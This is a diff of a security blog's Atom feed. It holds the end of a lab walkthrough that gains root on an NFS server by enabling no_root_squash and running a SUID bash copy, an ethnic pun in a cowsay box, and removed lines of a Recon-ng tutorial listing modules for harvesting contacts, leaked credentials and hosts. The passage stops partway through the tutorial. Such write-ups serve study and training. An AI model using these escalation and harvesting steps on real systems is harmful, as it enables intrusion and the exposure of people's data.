+<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#118;&#117;&#x6c;&#110;&#x69;&#x78;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x32;&#49;&#55;&#46;&#x31;&#52;&#50;">&#x76;&#117;&#108;&#110;&#x69;&#120;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#49;&#x37;&#x2e;&#x31;&#x34;&#x32;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ sudo -l
+</span><span class='line'>Matching 'Defaults' entries for vulnix on this host:
+</span><span class='line'>    env_reset,
+</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span><span class='line'>
+</span><span class='line'>User vulnix may run the following commands on this host:
+</span><span class='line'>    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
+</span><span class='line'>vulnix@vulnix:~$ ls -l
+</span><span class='line'>total 900
+</span><span class='line'>-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>
+
+<p>From the SSH, I verified it as the vulnix user:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ ls -l bash
+</span><span class='line'>-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally, I ran the shell while preserving its permissions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ ./bash -p
+</span><span class='line'>bash-4.2# whoami
+</span><span class='line'>root
+</span><span class='line'>bash-4.2# cat /root/trophy.txt
+</span><span class='line'>cc614640424f5bd60ce5d5264899c3be</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>
+
+<p><strong>Learn more</strong></p>
+
+<ul>
+<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
+<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
+<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
+</span><span class='line'>/ Q: What do you call a half-dozen    \
+</span><span class='line'>| Indians with Asian flu? A: Six sick |
+</span><span class='line'>\ Sikhs (sic).                        /
+</span><span class='line'> -------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[enum4linux - Kali Linux tools]]></title>
@@ -10010,1948 +10683,6 @@ as the invoker.</p></blockquote>
 </span><span class='line'>/ Fine day for friends. So-so day for \
 </span><span class='line'>\ you.                                /
 </span><span class='line'> -------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest tools - Recon-ng]]></title>
-    <link href="http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng/"/>
-    <updated>2016-08-29T15:30:18-04:00</updated>
-    <id>http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng</id>
-    <content type="html"><![CDATA[<p>In this post I&rsquo;ll discuss the use of the powerful web reconaissance framework, Recon-ng.</p>
-
-<p><a href="https://bitbucket.org/LaNMaSteR53/recon-ng">Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</a></p>
-
-<!-- more -->
-
-
-<p>Recon-ng is an invaluable tool for performing information gathering. It is modeled on the Metasploit framework, so the interface and functionality are pretty similar.</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/tools/recon-ng.png" title="recon-ng" alt="recon-ng"></p>
-
-<h1>Recon-ng core commands</h1>
-
-<p>With the help menu, you can get an overview of what commands are available:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; help
-</span><span class='line'>
-</span><span class='line'>Commands (type [help|?] &lt;topic&gt;):
-</span><span class='line'>---------------------------------
-</span><span class='line'>add             Adds records to the database
-</span><span class='line'>back            Exits the current context
-</span><span class='line'>delete          Deletes records from the database
-</span><span class='line'>exit            Exits the framework
-</span><span class='line'>help            Displays this menu
-</span><span class='line'>keys            Manages framework API keys
-</span><span class='line'>load            Loads specified module
-</span><span class='line'>pdb             Starts a Python Debugger session
-</span><span class='line'>query           Queries the database
-</span><span class='line'>record          Records commands to a resource file
-</span><span class='line'>reload          Reloads all modules
-</span><span class='line'>resource        Executes commands from a resource file
-</span><span class='line'>search          Searches available modules
-</span><span class='line'>set             Sets module options
-</span><span class='line'>shell           Executes shell commands
-</span><span class='line'>show            Shows various framework items
-</span><span class='line'>snapshots       Manages workspace snapshots
-</span><span class='line'>spool           Spools output to a file
-</span><span class='line'>unset           Unsets module options
-</span><span class='line'>use             Loads specified module
-</span><span class='line'>workspaces      Manages workspaces</span></code></pre></td></tr></table></div></figure>
-
-
-<p>You can already see the similarity with Metasploit. Let&rsquo;s focus on what&rsquo;s exclusive to to Recon-ng, the powerful recon capabilities. You can leverage different search engines and social media for information gathering. To leverage the most of this functionality, you will need to use API keys. Below you can see the available APIs:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; keys list
-</span><span class='line'>
-</span><span class='line'>  +---------------------------+
-</span><span class='line'>  |        Name       | Value |
-</span><span class='line'>  +---------------------------+
-</span><span class='line'>  | bing_api          |       |
-</span><span class='line'>  | builtwith_api     |       |
-</span><span class='line'>  | facebook_api      |       |
-</span><span class='line'>  | facebook_password |       |
-</span><span class='line'>  | facebook_secret   |       |
-</span><span class='line'>  | facebook_username |       |
-</span><span class='line'>  | flickr_api        |       |
-</span><span class='line'>  | fullcontact_api   |       |
-</span><span class='line'>  | google_api        |       |
-</span><span class='line'>  | google_cse        |       |
-</span><span class='line'>  | instagram_api     |       |
-</span><span class='line'>  | instagram_secret  |       |
-</span><span class='line'>  | ipinfodb_api      |       |
-</span><span class='line'>  | jigsaw_api        |       |
-</span><span class='line'>  | jigsaw_password   |       |
-</span><span class='line'>  | jigsaw_username   |       |
-</span><span class='line'>  | linkedin_api      |       |
-</span><span class='line'>  | linkedin_secret   |       |
-</span><span class='line'>  | pwnedlist_api     |       |
-</span><span class='line'>  | pwnedlist_iv      |       |
-</span><span class='line'>  | pwnedlist_secret  |       |
-</span><span class='line'>  | shodan_api        |       |
-</span><span class='line'>  | twitter_api       |       |
-</span><span class='line'>  | twitter_secret    |       |
-</span><span class='line'>  +---------------------------+</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In addition to the well known APIs of the main search engines and social media, there are the following:</p>
-
-<ul>
-<li><p>the BuiltWith Domain API, which provides XML and JSON access to the technology information of a website</p></li>
-<li><p>FullContact lets you easily query by email, phone number, or Twitter username. Results include publicly- available social profiles, photos, basic demographics, job titles, company stats, and over 100 other public data points.</p></li>
-<li><p>IPInfoDB, which provides free access to IP geolocation tools</p></li>
-<li><p>Jigsaw is an online directory of free, downloadable Company information and more than 11 million business Contacts. Every Jigsaw business Contact is complete with hard-to-find direct dials and email addresses, while each Company record gives the low down on Company size, location, and industry.</p></li>
-<li><p>PwnedList is designed for consumers to check if their email address has been found on commonly circulating lists of stolen accounts and passwords (this has been shut down at the time of this writing)</p></li>
-</ul>
-
-
-<p>If you were to add a new API key, you could do it like this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; keys add bing_api 007007
-</span><span class='line'>[*] Key 'bing_api' added.
-</span><span class='line'>[recon-ng][default] &gt; keys list
-</span><span class='line'>
-</span><span class='line'>  +----------------------------+
-</span><span class='line'>  |        Name       | Value  |
-</span><span class='line'>  +----------------------------+
-</span><span class='line'>  | bing_api          | 007007 |</span></code></pre></td></tr></table></div></figure>
-
-
-<p>To delete an API key, you can use the <code>keys delete</code> command.</p>
-
-<p>To see what items are available in the framework, use the <strong>show</strong> command:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; show
-</span><span class='line'>Shows various framework items
-</span><span class='line'>
-</span><span class='line'>Usage: show [banner|companies|contacts|credentials|dashboard|domains|hosts|leaks|locations|modules|netblocks|options|ports|profiles|pushpins|schema|vulnerabilities]</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This should give you an idea of the kinds of data you can look for. Again, this should feel similar to Metasploit. In fact, like in the msfconsole, the modules are what you will use to perform different tasks. Let&rsquo;s take a look at all the currently available modules. Oh, and did I mention there is tab completion as well? :D</p>
-
-<h1>Recon-ng modules</h1>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>show modules
-</span><span class='line'>
-</span><span class='line'>  Discovery
-</span><span class='line'>  ---------
-</span><span class='line'>    discovery/info_disclosure/cache_snoop
-</span><span class='line'>    discovery/info_disclosure/interesting_files
-</span><span class='line'>
-</span><span class='line'>  Exploitation
-</span><span class='line'>  ------------
-</span><span class='line'>    exploitation/injection/command_injector
-</span><span class='line'>    exploitation/injection/xpath_bruter
-</span><span class='line'>
-</span><span class='line'>  Import
-</span><span class='line'>  ------
-</span><span class='line'>    import/csv_file
-</span><span class='line'>    import/list
-</span><span class='line'>
-</span><span class='line'>  Recon
-</span><span class='line'>  -----
-</span><span class='line'>    recon/companies-contacts/facebook
-</span><span class='line'>    recon/companies-contacts/jigsaw/point_usage
-</span><span class='line'>    recon/companies-contacts/jigsaw/purchase_contact
-</span><span class='line'>    recon/companies-contacts/jigsaw/search_contacts
-</span><span class='line'>    recon/companies-contacts/jigsaw_auth
-</span><span class='line'>    recon/companies-contacts/linkedin_auth
-</span><span class='line'>    recon/companies-multi/whois_miner
-</span><span class='line'>    recon/companies-profiles/bing_linkedin
-</span><span class='line'>    recon/contacts-contacts/mailtester
-</span><span class='line'>    recon/contacts-contacts/mangle
-</span><span class='line'>    recon/contacts-contacts/unmangle
-</span><span class='line'>    recon/contacts-credentials/hibp_breach
-</span><span class='line'>    recon/contacts-credentials/hibp_paste
-</span><span class='line'>    recon/contacts-credentials/pwnedlist
-</span><span class='line'>    recon/contacts-domains/migrate_contacts
-</span><span class='line'>    recon/contacts-profiles/fullcontact
-</span><span class='line'>    recon/credentials-credentials/adobe
-</span><span class='line'>    recon/credentials-credentials/bozocrack
-</span><span class='line'>    recon/credentials-credentials/hashes_org
-</span><span class='line'>    recon/credentials-credentials/leakdb
-</span><span class='line'>    recon/domains-contacts/pgp_search
-</span><span class='line'>    recon/domains-contacts/salesmaple
-</span><span class='line'>    recon/domains-contacts/whois_pocs
-</span><span class='line'>    recon/domains-credentials/pwnedlist/account_creds
-</span><span class='line'>    recon/domains-credentials/pwnedlist/api_usage
-</span><span class='line'>    recon/domains-credentials/pwnedlist/domain_creds
-</span><span class='line'>    recon/domains-credentials/pwnedlist/domain_ispwned
-</span><span class='line'>    recon/domains-credentials/pwnedlist/leak_lookup
-</span><span class='line'>    recon/domains-credentials/pwnedlist/leaks_dump
-</span><span class='line'>    recon/domains-domains/brute_suffix
-</span><span class='line'>    recon/domains-hosts/baidu_site
-</span><span class='line'>    recon/domains-hosts/bing_domain_api
-</span><span class='line'>    recon/domains-hosts/bing_domain_web
-</span><span class='line'>    recon/domains-hosts/brute_hosts
-</span><span class='line'>    recon/domains-hosts/builtwith
-</span><span class='line'>    recon/domains-hosts/google_site_api
-</span><span class='line'>    recon/domains-hosts/google_site_web
-</span><span class='line'>    recon/domains-hosts/netcraft
-</span><span class='line'>    recon/domains-hosts/shodan_hostname
-</span><span class='line'>    recon/domains-hosts/ssl_san
-</span><span class='line'>    recon/domains-hosts/vpnhunter
-</span><span class='line'>    recon/domains-hosts/yahoo_domain
-</span><span class='line'>    recon/domains-vulnerabilities/punkspider
-</span><span class='line'>    recon/domains-vulnerabilities/xssed
-</span><span class='line'>    recon/domains-vulnerabilities/xssposed
-</span><span class='line'>    recon/hosts-domains/migrate_hosts
-</span><span class='line'>    recon/hosts-hosts/bing_ip
-</span><span class='line'>    recon/hosts-hosts/freegeoip
-</span><span class='line'>    recon/hosts-hosts/ip_neighbor
-</span><span class='line'>    recon/hosts-hosts/ipinfodb
-</span><span class='line'>    recon/hosts-hosts/resolve
-</span><span class='line'>    recon/hosts-hosts/reverse_resolve
-</span><span class='line'>    recon/locations-locations/geocode
-</span><span class='line'>    recon/locations-locations/reverse_geocode
-</span><span class='line'>    recon/locations-pushpins/flickr
-</span><span class='line'>    recon/locations-pushpins/instagram
-</span><span class='line'>    recon/locations-pushpins/picasa
-</span><span class='line'>    recon/locations-pushpins/shodan
-</span><span class='line'>    recon/locations-pushpins/twitter
-</span><span class='line'>    recon/locations-pushpins/youtube
-</span><span class='line'>    recon/netblocks-companies/whois_orgs
-</span><span class='line'>    recon/netblocks-hosts/reverse_resolve
-</span><span class='line'>    recon/netblocks-hosts/shodan_net
-</span><span class='line'>    recon/netblocks-ports/census_2012
-</span><span class='line'>    recon/ports-hosts/migrate_ports
-</span><span class='line'>    recon/profiles-contacts/dev_diver
-</span><span class='line'>    recon/profiles-contacts/linkedin
-</span><span class='line'>    recon/profiles-profiles/linkedin_crawl
-</span><span class='line'>    recon/profiles-profiles/namechk
-</span><span class='line'>    recon/profiles-profiles/profiler
-</span><span class='line'>    recon/profiles-profiles/twitter
-</span><span class='line'>
-</span><span class='line'>  Reporting
-</span><span class='line'>  ---------
-</span><span class='line'>    reporting/csv
-</span><span class='line'>    reporting/html
-</span><span class='line'>    reporting/json
-</span><span class='line'>    reporting/list
-</span><span class='line'>    reporting/pushpin
-</span><span class='line'>    reporting/xlsx
-</span><span class='line'>    reporting/xml</span></code></pre></td></tr></table></div></figure>
-
-
-<p>You can select a module via the <strong>load</strong> or <strong>use</strong> commands. Once in a module&rsquo;s context, you can see information about it with the <code>show info</code> command. Similarly, you can see the required options for a module with the <code>show options</code> command, and change them with <strong>set</strong>. Let&rsquo;s look at each module and see some usage examples</p>
-
-<h2>Discovery</h2>
-
-<ul>
-<li><p>DNS Cache Snooper &ndash; Uses the DNS cache snooping technique to check for visited domains</p></li>
-<li><p>Interesting File Finder &ndash; Checks hosts for interesting files in predictable locations</p></li>
-</ul>
-
-
-<p>Let&rsquo;s see more about this module:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][interesting_files] &gt; show info
-</span><span class='line'>
-</span><span class='line'>      Name: Interesting File Finder
-</span><span class='line'>      Path: modules/discovery/info_disclosure/interesting_files.py
-</span><span class='line'>    Author: Tim Tomes (@LaNMaSteR53), thrapt (thrapt@gmail.com), Jay Turla (@shipcod3), and Mark Jeffery
-</span><span class='line'>
-</span><span class='line'>Description:
-</span><span class='line'>  Checks hosts for interesting files in predictable locations.
-</span><span class='line'>
-</span><span class='line'>Options:
-</span><span class='line'>  Name      Current Value  Required  Description
-</span><span class='line'>  --------  -------------  --------  -----------
-</span><span class='line'>  DOWNLOAD  True           yes       download discovered files
-</span><span class='line'>  PORT      80             yes       request port
-</span><span class='line'>  PROTOCOL  http           yes       request protocol
-</span><span class='line'>  SOURCE    default        yes       source of input (see 'show info' for details)
-</span><span class='line'>
-</span><span class='line'>Source Options:
-</span><span class='line'>  default        SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL ORDER BY host
-</span><span class='line'>  &lt;string&gt;       string representing a single input
-</span><span class='line'>  &lt;path&gt;         path to a file containing a list of inputs
-</span><span class='line'>  query &lt;sql&gt;    database query returning one column of inputs
-</span><span class='line'>
-</span><span class='line'>Comments:
-</span><span class='line'>  * Files: robots.txt, sitemap.xml, sitemap.xml.gz, crossdomain.xml, phpinfo.php, test.php, elmah.axd,
-</span><span class='line'>  server-status, jmx-console/, admin-console/, web-console/
-</span><span class='line'>  * Google Dorks:
-</span><span class='line'>    - inurl:robots.txt ext:txt
-</span><span class='line'>    - inurl:elmah.axd ext:axd intitle:"Error log for"
-</span><span class='line'>    - inurl:server-status "Apache Status"</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I found this a bit confusing at first, but the SOURCE is the equivalent of the target you do recon on. I ran this on my own blog for a demo. When setting a target, keep in mind not to include the http or https (the protocol setting handles that), and also to exclude the trailing slash (I got errors until I did that).</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][interesting_files] &gt; run
-</span><span class='line'>[*] http://chousensha.github.io:80/robots.txt =&gt; 200. 'robots.txt' found!
-</span><span class='line'>[*] http://chousensha.github.io:80/sitemap.xml =&gt; 200. 'sitemap.xml' found!
-</span><span class='line'>[*] http://chousensha.github.io:80/sitemap.xml.gz =&gt; 404
-</span><span class='line'>[*] http://chousensha.github.io:80/crossdomain.xml =&gt; 404
-</span><span class='line'>[*] http://chousensha.github.io:80/phpinfo.php =&gt; 404
-</span><span class='line'>[*] http://chousensha.github.io:80/test.php =&gt; 404
-</span><span class='line'>[*] http://chousensha.github.io:80/elmah.axd =&gt; 404
-</span><span class='line'>[*] http://chousensha.github.io:80/server-status =&gt; 404
-</span><span class='line'>[*] http://chousensha.github.io:80/jmx-console/ =&gt; 404
-</span><span class='line'>[*] http://chousensha.github.io:80/admin-console/ =&gt; 404
-</span><span class='line'>[*] http://chousensha.github.io:80/web-console/ =&gt; 404
-</span><span class='line'>[*] 2 interesting files found.
-</span><span class='line'>[*] ...downloaded to '/root/.recon-ng/workspaces/default/'</span></code></pre></td></tr></table></div></figure>
-
-
-<p>You can see recon-ng found 2 interesting files and it downloaded them to my machine</p>
-
-<h2>Exploitation</h2>
-
-<ul>
-<li><p>Remote Command Injection Shell Interface &ndash; Provides a shell interface for remote command injection flaws in web applications</p></li>
-<li><p>Xpath Injection Brute Forcer &ndash; Exploits XPath injection flaws to enumerate the contents of serverside XML documents</p></li>
-</ul>
-
-
-<h2>Import</h2>
-
-<ul>
-<li><p>Advanced CSV File Importer &ndash; Imports values from a CSV file into a database table.</p></li>
-<li><p>List File Importer &ndash; Imports values from a list file into a database table and column</p></li>
-</ul>
-
-
-<h2>Recon</h2>
-
-<ul>
-<li><p>Facebook Contact Enumerator &ndash; Harvests contacts from Facebook.com. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
-<li><p>Jigsaw &ndash; Point Usage Statistics Fetcher &ndash; Queries the Jigsaw API for the point usage statistics of the given account.</p></li>
-<li><p>Jigsaw &ndash; Single Contact Retriever &ndash; Retrieves a single complete contact from the Jigsaw.com API using points from the given account</p></li>
-<li><p>Jigsaw Contact Enumerator &ndash; Harvests contacts from the Jigsaw.com API. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
-<li><p>Jigsaw Authenticated Contact Enumerator &ndash; Harvests contacts from Data.com using an authenticated user account. Updates the &lsquo;contacts&rsquo; table
-with the results. Use &lsquo;keys&rsquo; to set your jigsaw username and password before use.</p></li>
-<li><p>LinkedIn Authenticated Contact Enumerator &ndash; Harvests contacts from the LinkedIn.com API using an authenticated connections network. Updates the
-&lsquo;contacts&rsquo; table with the results.</p></li>
-<li><p>Whois Data Miner &ndash; Uses the ARIN Whois RWS to harvest companies, locations, netblocks, and contacts associated with the
-given company search string. Updates the respective tables with the results.</p></li>
-</ul>
-
-
-<p>Let&rsquo;s see this in action against Yahoo:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
